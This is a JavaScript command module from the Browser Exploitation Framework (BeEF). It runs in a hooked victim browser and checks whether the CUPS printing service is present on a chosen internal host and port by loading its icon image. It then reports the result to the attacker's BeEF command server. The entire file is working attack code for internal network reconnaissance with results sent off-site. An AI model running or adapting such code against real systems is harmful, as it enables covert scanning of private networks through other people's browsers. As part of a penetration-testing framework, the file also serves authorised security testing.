//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var result = "Not Installed";
	var dom = document.createElement('b');
	var img = new Image;
	img.src = "http://<%= @ipHost %>:<%= @port %>/images/cups-icon.png";
	img.onload = function() {
		if (this.width == 128 && this.height == 128) result="Installed";
		beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto=http&ip=<%= @ipHost %>&port=<%= @port %>&cups='+result, beef.are.status_success());
		dom.removeChild(this);
	}
	img.onerror = function() {
		beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto=http&ip=<%= @ipHost %>&port=<%= @port %>&cups='+result, beef.are.status_error());
		dom.removeChild(this);
	}
	dom.appendChild(img);

});

